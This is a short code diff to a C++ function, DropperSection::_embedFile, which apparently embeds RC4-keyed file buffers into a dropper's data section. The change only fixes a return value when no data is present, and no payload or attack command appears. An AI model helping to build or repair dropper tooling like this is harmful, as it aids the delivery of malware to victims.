@@ -233,7 +233,7 @@ char* DropperSection::_embedFile(char* rc4key, NamedFileBuffer& source, DataSect
 {
 	// check if we have some data to be appended
 	if (source.buffer == NULL && source.size <= 0)
-		return 0;
+		return ptr;
 	
 	// copy name of file
 	name.offset = ptr - _data;
